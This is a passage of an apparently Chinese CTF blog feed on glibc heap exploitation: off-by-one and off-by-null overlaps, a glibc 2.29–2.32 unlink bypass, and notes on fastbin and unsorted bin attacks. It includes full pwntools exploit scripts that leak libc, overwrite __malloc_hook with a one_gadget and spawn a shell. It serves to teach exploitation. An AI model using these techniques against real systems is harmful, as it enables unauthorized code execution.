class="hljs-number">0x3c3b78</span><br>mlh=libc_base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>ogg=libc_base+<span class="hljs-number">0xef9f4</span><br>log.success(<span class="hljs-built_in">hex</span>(libc_base))<br>log.success(<span class="hljs-built_in">hex</span>(ogg))<br>log.success(<span class="hljs-built_in">hex</span>(mlh))<br>free(<span class="hljs-number">4</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0xd0</span>,<span class="hljs-string">&#x27;x&#x27;</span>*<span class="hljs-number">0xd0</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+p64(mlh-<span class="hljs-number">0x30</span>+<span class="hljs-number">0xd</span>)<br>edit(<span class="hljs-number">4</span>,payload)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x60</span>,p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(ogg))<br><span class="hljs-comment">#debug()</span><br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>



<h1 id="offbynull"><a href="#offbynull" class="headerlink" title="offbynull"></a>offbynull</h1><h2 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h2><p>其实本质也是一种offbyone，只是这个溢出的字节我们无法控制，只能是0。所以构造方法会与offbyone有些不同，但目的都是为了制造出overlap，毕竟uaf才是堆利用的核心！</p>
<p>offbynull情形：</p>
<ul>
<li>把你输入的堆块的地址加上输入的字符长度的地方置为0（一般来说没我下面的例题那么明显，会进行很多运算以及操作，但是本质还是一样的）</li>
<li>strcpy没做限制直接复制，如果输满的话会把字符串末尾的’\x00’一起复制过来，导致溢出一个0</li>
</ul>
<p>怎么利用呢？因为溢出的是0，所以明显只能把修改preinuse位修改了，所以这边都是申请0xf8大小的堆块，这样的堆块刚好为0x101，溢出的0只会修改preinuse，不会影响大小</p>
<p>利用方式：</p>
<p>abcd四个大小为0x100的堆块，都是在使用状态，这时候我们的目标堆块是C堆块</p>
<img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726170224084.png" style="zoom:80%;"><span class="image-caption">image-20210726170224084</span>

<p>我们在B中输入 ‘A’*0x90 + p64(0x200) + ‘\x00’，输入完后布局将会变化成这样</p>
<img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726170351639.png" style="zoom:80%;"><span class="image-caption">image-20210726170351639</span>

<p>此时，C的previnuse位被改成了0，程序会将B看作已经被释放的堆块。然后由于系统是通过prevsize位来定位前一个堆块的位置，在这里，我们将其改成了0x200,也就是说定位到了A堆块。然后先将A free掉放入unsortedbin，这时候再free C，就会触发合并操作。ABC将会被看作一个大小为0x300的堆块放入unsortedbin中。然而实际上，B并没有被free，我们也就通过这样的方式构造了overlap</p>
<p>在实际运用时，不局限都是0x100的，可以是中间的某个堆块是fast chunk也行，但是第一个在头的必须得是unsorted chunk大小的堆块，否则无法触发合并。</p>
<h2 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h2><p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726173924395.png"><span class="image-caption">image-20210726173924395</span></p>
<p>看程序的add函数里面，会把输入的长度多一个字节的地方置为0</p>
<p>这边有些奇怪，不懂为什么，如果只是用四个进行构造，将会报错，但是五个就行，第一个是用来泄露libc基址的，不用理会</p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726174131814.png"><span class="image-caption">image-20210726174131814</span></p>
<p>这是修改完目标堆块，以及释放了指向的堆块（目标堆块减去0x300）</p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726174439990.png"><span class="image-caption">image-20210726174439990</span></p>
<p>最后把目标堆块释放，触发合并，变成了0x400的堆块</p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726174611943.png"><span class="image-caption">image-20210726174611943</span></p>
<p>之后就是构造大小为0x71的堆块，这边构造堆块要注意，在被构造的堆块后面还要构造一个堆头，因为需要preinuse位置为1来表示我们构造的堆块是被使用的，然后才能被释放进入到fastbin里面</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./offbynull&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx,size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;size:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;content:&quot;</span>)<br>	p.send(content)	<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45206 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4525a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xef9f4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf0897 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">&#x27;x&#x27;</span>*<span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">&#x27;cccc&#x27;</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">&#x27;dddd&#x27;</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">&#x27;eeee&#x27;</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">&#x27;gggg&#x27;</span>)<br><br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">8</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">8</span>)<br>libc_base=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x3c3b00</span><br>mlh=libc_base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>ogg=libc_base+<span class="hljs-number">0xef9f4</span><br>log.success(<span class="hljs-built_in">hex</span>(libc_base))<br>log.success(<span class="hljs-built_in">hex</span>(ogg))<br>log.success(<span class="hljs-built_in">hex</span>(mlh))<br><br>free(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;c&#x27;</span>*<span class="hljs-number">0xf0</span>+p64(<span class="hljs-number">0x300</span>))<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">4</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xf0</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x81</span>)  <span class="hljs-comment">#0x81让系统知道前面的堆块是被使用的</span><br><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x1f0</span>,payload)<br>free(<span class="hljs-number">2</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xf0</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+p64(mlh-<span class="hljs-number">0x30</span>+<span class="hljs-number">0xd</span>)<br>edit(<span class="hljs-number">1</span>,payload)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x60</span>,p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(ogg))<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h1 id="glibc2-29-2-32-off-by-null-bypass"><a href="#glibc2-29-2-32-off-by-null-bypass" class="headerlink" title="glibc2.29~2.32 off by null bypass"></a>glibc2.29~2.32 off by null bypass</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>浏览大佬博客时，发现大佬竟然整理了一篇glibc2.29~2.32 off by null bypass，如获至宝，学习为敬！</p>
<p>博客地址：<a href="http://blog.wjhwjhn.com/archives/193/">http://blog.wjhwjhn.com/archives/193/</a></p>
<h2 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h2><p>在 glibc2.29 及以后版本，glibc 在 unlink 内加入了 prevsize check，而通过 off by null 漏洞根本无法直接修改正常 chunk 的 size，导致想要 通过 unlink 制造出堆块重叠变得几乎不可能。当然 off by one 是没有影响的。所以在 2.29 及以上版本，off by null 的利用只有唯一的方法 —— 伪造 FD 和 BK</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp">    <span class="hljs-comment">/* consolidate backward */</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">prev_inuse</span>(p)) &#123;<br>  prevsize = <span class="hljs-built_in">prev_size</span> (p);<br>  size += prevsize;<br>  p = <span class="hljs-built_in">chunk_at_offset</span>(p, -((<span class="hljs-keyword">long</span>) prevsize));<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (<span class="hljs-built_in">chunksize</span>(p) != prevsize))<br>    <span class="hljs-built_in">malloc_printerr</span> (<span class="hljs-string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);<br>  <span class="hljs-built_in">unlink_chunk</span> (av, p);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>但是伪造 FD 和 BK 需要绕过下面的检测才行 </p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))      <br>  malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);<br></code></pre></td></tr></table></figure>

<h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><h3 id="no-pie"><a href="#no-pie" class="headerlink" title="no pie"></a>no pie</h3><p>这种情况其实就是之前写过的unlink attack，劫持程序中用于<strong>储存堆块指针的数组</strong>，从而达成任意地址写的目。</p>
<h3 id="拥有堆地址"><a href="#拥有堆地址" class="headerlink" title="拥有堆地址"></a>拥有堆地址</h3><p><img src="/2021/07/20/2021-07-26-offbyone&null/0ce506d87fdbbe100ec80d1bc6f87725.png"><span class="image-caption">图片</span></p>
<p>我们可以仿照上面的情况，在一个可以写入内容的堆块比如0x20的位置（ptr）上填入将要unlink的堆块地址，然后在将要unlink的堆块的 fd，bk 指针上写入<code>ptr-0x18</code>，<code>ptr-0x10</code>即可绕过检测，实现unlink</p>
<h3 id="无法泄露堆地址"><a href="#无法泄露堆地址" class="headerlink" title="无法泄露堆地址"></a>无法泄露堆地址</h3><p>不可泄露堆地址的各种方法归根结底都是通过<strong>部分写入</strong>和<strong>各种堆管理器的性质</strong>来改写出想要指向的堆块地址从而绕过检测</p>
<h4 id="一、在借用large-chunk上的垃圾数据"><a href="#一、在借用large-chunk上的垃圾数据" class="headerlink" title="一、在借用large chunk上的垃圾数据"></a>一、在借用large chunk上的垃圾数据</h4><p>当只有一个 large chunk 在 bin 链上时，fd_nextsize 和 bk_nextsize 是存放large chunk本身的堆地址。要利用这两个残余的垃圾的数据，把这两个数据作为我们要构造的 fake chunk 的 fd bk 指针。</p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20211001161409749.png"><span class="image-caption">image-20211001161409749</span></p>
<p>首先这是 large chunk 的结构</p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20211001164643331.png"></p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20211001161853438.png"><span class="image-caption">image-20211001161853438</span></p>
<p>这是经过伪造后的 large chunk 以及我们要用得一个可以被控制的 chunk ，首先从0x10开始作为 fake chunk 的堆头开始布置，通过部分写把 fake fd指针改为 chunk 的地址，同时部分写入修改 chunk bk 指针为 fake chunk，从而绕过第一个检查 FD-&gt;bk == p</p>
<p>接下来就是绕过第二个检查 BK-&gt;fd == p，我们利用 fastbin 的特性：会在 fd 指针留下前一块的堆地址，在 large chunk 的 fd 指针位置写入堆地址，然后借着部分写入修改为 fake chunk addr - 0x10。因为再加上本来的 bk_nextsize 就是指向 large chunk ，即可完成第二个检查的绕过。</p>
<p>tcache 的话，在glibc 2.29以上的版本加入的 key 字段会破坏 bk 指针的内容，而在这之下的版本应该也很少会用到这么复杂的手法去构造</p>
<p>修改方法为：然后先释放一个堆块 a，再释放 largebin chunk，这时候再 largebin chunk + 0x10 的位置就会有一个 a 的指针。我们再用部分写入将指针改写成 largebin chunk + 0x10 的地址。</p>
<h4 id="二、利用-unsorted-bin-和-large-bin-链机制"><a href="#二、利用-unsorted-bin-和-large-bin-链机制" class="headerlink" title="二、利用 unsorted bin 和 large bin 链机制"></a>二、利用 unsorted bin 和 large bin 链机制</h4><p>这部分内容如果利用得当，可以在题目的苛刻的条件下（如会在末尾写入 x00 等…）也可以无需爆破伪造堆块</p>
<p>以下内容全部复制自大佬博客：</p>
<h5 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h5><h5 id="1-在-fd-和-bk-写堆地址"><a href="#1-在-fd-和-bk-写堆地址" class="headerlink" title="1. 在 fd 和 bk 写堆地址"></a>1. 在 fd 和 bk 写堆地址</h5><p>如下图所示，堆块 0x55555555bc00 是我们要用于构造的堆块地址。</p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/4d011f51c99d6a925d5ee5c25aabdadd.png"><span class="image-caption">图片</span></p>
<p>通过 unsorted bin 链表我们让这个堆块的 fd 和 bk 都写了一个堆地址</p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/dbe25454747c3469ac4c83297c0536c6.png"><span class="image-caption">图片</span></p>
<h6 id="构造图："><a href="#构造图：" class="headerlink" title="构造图："></a>构造图：</h6><p><img src="/2021/07/20/2021-07-26-offbyone&null/c4c7f62c37e418f3d4fc252601150155.png"><span class="image-caption">图片</span></p>
<p>其中辅助堆块的作用在之后会提及</p>
<h6 id="构造代码："><a href="#构造代码：" class="headerlink" title="构造代码："></a><strong>构造代码：</strong></h6><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x418</span>) <span class="hljs-comment">#0 fd</span><br>add(<span class="hljs-number">0x108</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x418</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x438</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x108</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x428</span>) <span class="hljs-comment"># 5 bk </span><br>add(<span class="hljs-number">0x108</span>) <span class="hljs-comment"># 6</span><br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">3</span>)<br>delete(<span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure>



<h3 id="2-在伪造堆块附近申请堆块"><a href="#2-在伪造堆块附近申请堆块" class="headerlink" title="2. 在伪造堆块附近申请堆块"></a>2. 在伪造堆块附近申请堆块</h3><p>由于我们要通过部分写入的方法来绕过检测，而在堆空间中，只有低三字节是固定的。</p>
<p>所以我们为了逃避爆破，希望能够找到只需要覆盖最低一字节就可以修改成 fake chunk 的地址，于是我们应该利用在 fake 堆块附近 0x100 内的堆块来作为辅助堆块写地址，<strong>之前申请的辅助堆块就是起到了这个作用，我们可以利用这个堆块来进行重分配，使得分配的地址非常贴近利用堆块</strong>。</p>
<h4 id="构造图：-1"><a href="#构造图：-1" class="headerlink" title="构造图："></a>构造图：</h4><p><img src="/2021/07/20/2021-07-26-offbyone&null/8940fc1f7a2579bed0c78b865df9a6c9.png"><span class="image-caption">图片</span></p>
<p>可以发现，我们先让辅助堆块和利用堆块合并之后再对空间进行重新分配，使得堆块 2 恰好可以覆盖到之前利用堆块的 size，且堆块 3 的 0x55555555bc20，十分贴近之前 0x55555555bc00，只需要抹去最低一字节即可。</p>
<h4 id="构造代码：-1"><a href="#构造代码：-1" class="headerlink" title="构造代码："></a>构造代码：</h4><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">delete(<span class="hljs-number">2</span>) <span class="hljs-comment">#2 &amp; 3 unlink</span><br>add(<span class="hljs-number">0x438</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x418</span> + p64(<span class="hljs-number">0xA91</span>))  <span class="hljs-comment"># 0 set size</span><br>add(<span class="hljs-number">0x418</span>)  <span class="hljs-comment"># 2 c20</span><br>add(<span class="hljs-number">0x428</span>)  <span class="hljs-comment"># 3 bk 150</span><br>add(<span class="hljs-number">0x418</span>)  <span class="hljs-comment"># 5 fd 2b0</span><br></code></pre></td></tr></table></figure>



<h4 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h4><p>分配完成之后，我们再把全部堆块申请回来，这可能并不是步骤最少的做法，但是全部申请回来可以使得操作有条理，使得我们构造过程中出现的问题减少。</p>
<h3 id="3-修复-fake-fd"><a href="#3-修复-fake-fd" class="headerlink" title="3. 修复 fake fd"></a>3. 修复 fake fd</h3><h4 id="修复思路："><a href="#修复思路：" class="headerlink" title="修复思路："></a>修复思路：</h4><p>我们在之前的状态下，先删除 <strong>fake-&gt;FD 堆块</strong>，再删除<strong>重分配堆块 2（辅助堆块）</strong>。我们就可以在 <strong>fake-&gt;FD 堆块的 BK 位置</strong>写入一个<strong>重分配堆块 2（辅助堆块）</strong>的值</p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/8926f053ddc0e4cc4366e19babb9f47e.png"><span class="image-caption">图片</span></p>
<p>再用部分写入一字节来覆盖，覆盖成<strong>利用堆块</strong>的指针</p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/400f4af89ed8abec85d3e1567007d7b2.png"><span class="image-caption">图片</span></p>
<p>最后再把 bc20 这个辅助堆块申请回来，方便下一次使用。</p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/e9f7b1f6bde94a7ee9b2816e4da7ea0e.png"><span class="image-caption">图片</span></p>
<h4 id="构造代码：-2"><a href="#构造代码：-2" class="headerlink" title="构造代码："></a>构造代码：</h4><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># partial overwrite fd -&gt; bk by unsorted bin list</span><br>delete(<span class="hljs-number">5</span>)<br>delete(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x418</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">9</span>)  <span class="hljs-comment"># 2 partial overwrite bk</span><br>add(<span class="hljs-number">0x418</span>)  <span class="hljs-comment"># 5 c20</span><br></code></pre></td></tr></table></figure>



<h5 id="4-修复-fake-bk"><a href="#4-修复-fake-bk" class="headerlink" title="4. 修复 fake bk"></a>4. 修复 fake bk</h5><h6 id="修复思路：-1"><a href="#修复思路：-1" class="headerlink" title="修复思路："></a>修复思路：</h6><p>在我示例的这道题下，使用 unsorted bin 来修复另外 <strong>fake bk</strong> 是很难的，这是因为这道题如果要进 unsorted bin 的堆块，size 大小要大于等于 0x418，而这个 size 是在 largebin 范围内的。</p>
<p>所以如果我使用不同 size 申请的方法，错开<strong>辅助堆块</strong>去直接申请 <strong>fake bk 堆块（因为如果要在 fake bk-&gt;fd 的位置写堆值，那么在遍历的时候一定是先遍历到辅助堆块，所以需要错开辅助堆块先去申请 fake bk 堆块，我想到的方法就是申请一个辅助堆块无法提供的 size 来错开。但事实上，错开辅助堆块会使得辅助堆块进入 largebin 中，从而与原来的 fake bk 断链，这样原来已经写上的堆地址也不复存在）</strong>，因为这个原因所以这部分我要先让堆块进入 largebin 再用<strong>类似于修复 fake fd 的方法进行修复。</strong></p>
<p>先删除<strong>重分配堆块 2（辅助堆块）</strong>，再删除 <strong>fake-&gt;BK 堆块</strong>（注意：这里和上面顺序不一致，这是因为想要写入堆块地址的位置不一致）</p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/7b03f181d1dbc20c0b2c7d698b6d8b38.png"><span class="image-caption">图片</span></p>
<p>再让堆块进入到 largebin 中</p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/0d5737399f40b84abd6d99d282c0f2c8.png"><span class="image-caption">图片</span></p>
<p>再使用部分写入恢复 <strong>fake bk</strong></p>
<p><img src="/2021/07/20/2021-07-26-offbyone&null/e39634201bd2beefba9ec4e3821920e6.png"><span class="image-caption">图片</span></p>
<p>构造代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># partial overwrite bk -&gt; fd by largebin list</span><br>delete(<span class="hljs-number">5</span>)<br>delete(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">0x9F8</span>)  <span class="hljs-comment"># 3 chunk into largebin</span><br>add(<span class="hljs-number">0x428</span>, <span class="hljs-string">&#x27;a&#x27;</span>)  <span class="hljs-comment"># 5 partial overwrite fd</span><br>add(<span class="hljs-number">0x418</span>)  <span class="hljs-comment"># 7 c20</span><br></code></pre></td></tr></table></figure>

<h5 id="5-伪造-prev-size，off-by-null-修改-size-的-p-标志位"><a href="#5-伪造-prev-size，off-by-null-修改-size-的-p-标志位" class="headerlink" title="5. 伪造 prev_size，off by null 修改 size 的 p 标志位"></a>5. 伪造 prev_size，off by null 修改 size 的 p 标志位</h5><p>这部分内容不是本文重点故略过</p>
<h6 id="构造代码：-3"><a href="#构造代码：-3" class="headerlink" title="构造代码："></a>构造代码：</h6><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># off by null</span><br>add(<span class="hljs-number">0x108</span>, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x111</span>))  <span class="hljs-comment"># 8</span><br>edit(<span class="hljs-number">6</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x100</span> + p64(<span class="hljs-number">0xA90</span>))<br>delete(<span class="hljs-number">3</span>)  <span class="hljs-comment"># unlink</span><br></code></pre></td></tr></table></figure>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>低版本的检查过少的时代已经一去不返，新版本的检查增多，使得利用手法也随之复杂，但本质都是堆块的良好布局，对各种bin链上用于管理而会残余的垃圾数据进行利用，以及在新版本下似乎有些趋向于利用 large chunk 构造堆块了。最后大佬使用的布置思想十分值得我这个小菜鸡深刻学习理解，为了避免爆破而构造出偏移在0x100内的堆块，膜拜pwn👴</p>
]]></content>
      <tags>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>bin链情况集合</title>
    <url>/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E5%90%88%E9%9B%86/</url>
    <content><![CDATA[<p><img src="/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E5%90%88%E9%9B%86/image-20210720154252123-1627363406388.png"><span class="image-caption">image-20210720154252123</span></p>
<h1 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h1><h3 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h3><ul>
<li><p>大小范围：0x20 - 0x80</p>
</li>
<li><p>单链表结构，只有fd指针</p>
</li>
<li><p>FILO（最后一个进入fastbin链表的，会被放在头部）<br>总共有十个fastbin链表，每个链表中fastbin的size一样，0x10递增<br>大小属于fastbin的chunk被free掉时，不会改变nextchunk的previnuse位，也就是说不会被合并。</p>
</li>
</ul>
<p><img src="/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E5%90%88%E9%9B%86/image-20210720154343954-1627363410633.png"><span class="image-caption">image-20210720154343954</span></p>
<h3 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h3><ul>
<li>被释放的堆块的fd指针不能指向自己（这也就是想要double free的时候，还需要一个中间chunk的原因）</li>
<li>将fastbin里面的chunk分配出去时，会检查size位会不会匹配chunk的大小，会才能分配</li>
</ul>
<h3 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h3><p>构造两个相同 size 的堆块 a 和 b，我们先 free (a) 让他进入到 fast bin 中，再 free (b) 也让他进入到 fast bin中。这时候，在堆块 b 的 fd 位置就存在着堆块 a 的地址，我们 leak 出来就能够得到堆地址</p>
<h1 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h1><h3 id="基本结构-1"><a href="#基本结构-1" class="headerlink" title="基本结构"></a>基本结构</h3><img src="/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E5%90%88%E9%9B%86/image-20210726103140256-1627266738935.png" style="zoom:80%;">



<ul>
<li><p>只有一个双向链表，存在fd和bk指针</p>
</li>
<li><p>在unsorted bin中，对chunk的大小并没有限制，任何大小的chunk（未被归类）都可以归属到unsorted bin中，临时存储用</p>
</li>
<li><p>unsortedbin采用的遍历顺序是FIFO</p>
</li>
<li><p>chunk被释放进入unsortedbin时，fdbk字段会留下一个main_arena的地址信息</p>
</li>
</ul>
<h3 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h3><p>libc-2.29.so以下：</p>
<p>利用前提是先有UAF，修改 unsorted chunk 中的 FD 字段为0，BK字段为 target addr - 0x10，然后 malloc 一个相同大小的chunk，即可完成攻击，在目标地址写入 unsorted bin 的地址，一般用来伪造堆头（制造出0x7f）、修改次数限制、上限信息、配合局部写</p>
<h3 id="小技巧-1"><a href="#小技巧-1" class="headerlink" title="小技巧"></a>小技巧</h3><p>当 unsorted bin 链上有两个堆块的时候，其中一个堆块的 fd 会指向另一个堆块，我们可以直接 leak 得到，可计算出堆基址</p>
